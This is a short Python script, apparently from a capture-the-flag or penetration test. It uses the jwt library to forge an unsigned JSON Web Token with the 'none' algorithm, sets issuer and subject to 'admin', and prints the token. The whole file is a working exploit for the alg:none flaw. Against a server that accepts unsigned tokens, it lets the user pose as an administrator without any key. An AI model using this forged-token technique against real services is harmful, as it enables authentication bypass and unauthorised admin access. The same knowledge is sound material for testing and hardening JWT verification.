import jwt
Payload = {
   "iss": "admin",
  "iat": 1709305735,
  "exp": 1709312935,
  "nbf": 1709305735,
  "sub": "admin",
  "jti": "eed0ddf346c6f427a18d96e9d6554b6f"
}
headers = {
  "alg": "none",
  "typ": "JWT"
}
json_web_token = jwt.encode(payload=Payload,key="",algorithm="none",headers=headers)
print(json_web_token)